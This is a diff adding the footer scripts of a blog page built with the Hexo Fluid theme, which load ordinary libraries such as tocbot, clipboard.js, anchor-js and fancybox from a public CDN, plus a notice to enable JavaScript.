+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
